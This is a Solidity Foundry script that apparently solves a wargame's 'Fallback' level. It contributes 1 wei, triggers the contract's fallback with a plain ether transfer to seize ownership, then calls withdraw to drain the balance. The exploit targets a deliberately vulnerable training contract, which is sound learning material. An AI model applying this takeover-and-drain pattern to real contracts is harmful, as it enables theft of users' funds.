// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/Fallback.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallbackSolution is Script {
    Fallback public fallbackInstance = Fallback(payable(0x06d68a11524F98Bb66ad4d2BF1f005e7e8293F07));

    function run() external {
        vm.startBroadcast(vm.envAddress("MY_ADDRESS"));
        fallbackInstance.contribute{value: 1 wei}();
        address(fallbackInstance).call{value: 1 wei}("");
        console.log("New Owner: ", fallbackInstance.owner());
        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));
        fallbackInstance.withdraw();
        console.log("Balance: ", address(fallbackInstance).balance);
        vm.stopBroadcast();
    }
}